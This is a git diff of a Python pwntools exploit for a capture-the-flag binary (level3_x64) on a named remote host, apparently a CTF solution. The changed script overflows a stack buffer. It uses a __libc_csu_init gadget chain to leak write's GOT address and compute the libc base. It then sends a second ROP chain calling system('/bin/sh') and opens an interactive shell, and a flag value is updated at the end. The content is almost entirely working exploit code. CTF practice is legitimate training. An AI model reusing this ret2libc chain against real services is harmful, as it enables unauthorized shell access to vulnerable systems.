@@ -16,6 +16,7 @@ import sys
 from os import path
 from pwn import *
 from pwnlib import gdb
+from pwnlib.ui import pause
 
 context(arch="amd64", os="linux", log_level="debug")
 
@@ -23,11 +24,13 @@ elf_name = path.join(path.dirname(path.abspath(__file__)), "level3_x64_patched")
 _, host, port = "nc pwn2.jarvisoj.com 9883".split(" ")
 
 elf = ELF(elf_name)
+libc = elf.libc
 io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
 
 
 def exp_x64_csu_init(
     pop_rbx_addr: int,
+    mov_rdx_r13_addr: int,
     ret_addr: int,
     p_func_addr:int,
     arg1:int,
@@ -37,8 +40,8 @@ def exp_x64_csu_init(
     """
     仅适用于：
         1. 三个参数以内函数
-        2. 溢出空间较大（> 120 bytes）
-        3. 第一个参数较小，例如write和read等
+        2. 溢出空间较大（> 128 bytes）
+        3. 第一个参数较小（< 4 bytes），例如write和read等
     """
     import struct
     return b"".join([
@@ -49,24 +52,47 @@ def exp_x64_csu_init(
         struct.pack("<Q", arg3),  # pop     r13; mov     rdx, r13
         struct.pack("<Q", arg2),  # pop     r14; mov     rsi, r14
         struct.pack("<Q", arg1),  # pop     r15; mov     edi, r15d
+        struct.pack("<Q", mov_rdx_r13_addr),
         7 * struct.pack("<Q", 0xcafebeefdeadface),
         struct.pack("<Q", ret_addr),
     ])
 
 
 def main():
-    io.recvuntil("\n")
-    POP_RBX = 0x4006AA  # => RDX
-    payload = b"@" * (0x80 + 8) + exp_x64_csu_init(
+    POP_RBX = 0x4006AA
+    MOV_RDX_R13 = 0x400690
+    POP_RDI_RET = 0x4006b3
+    payload = b"@" * (0x80 + 8)
+    payload += exp_x64_csu_init(
         POP_RBX,
+        MOV_RDX_R13,
         elf.sym["_start"],
         elf.got["write"],
         1, elf.got["write"], 8
     )
+    # gdb.attach(io, gdbscript="""
+    #     b *0x400619
+    #     b *0x4006AA
+    # """)
+    # pause()
+    io.recvuntil(":\n")
     io.send(payload)
+    write_addr = u64(io.recv(8))
+    libc.address = write_addr - libc.sym["write"]
+
+    payload = flat((
+        b"@" * (0x80 + 8),
+        POP_RDI_RET,
+        next(libc.search(b"/bin/sh")),
+        libc.sym["system"],
+    ))
+    io.recvuntil(":\n")
+    # pause()
+    io.send(payload)
+
     io.interactive()
 
 if __name__ == "__main__":
     main()
 
-# CTF{081ecc7c8d658409eb43358dcc1cf446}
+# CTF{b1aeaa97fdcc4122533290b73765e4fd}
